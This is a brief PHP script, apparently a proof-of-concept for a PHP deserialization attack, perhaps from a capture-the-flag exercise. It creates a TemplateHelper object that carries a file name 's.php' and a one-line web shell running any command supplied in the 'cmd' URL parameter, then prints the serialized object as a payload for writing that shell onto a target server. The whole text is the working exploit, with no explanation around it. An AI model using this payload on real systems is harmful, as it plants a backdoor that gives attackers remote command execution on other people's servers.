<?=

$th = new TemplateHelper("s.php",'<?=System($_GET[cmd]);?>');

echo serialize($th);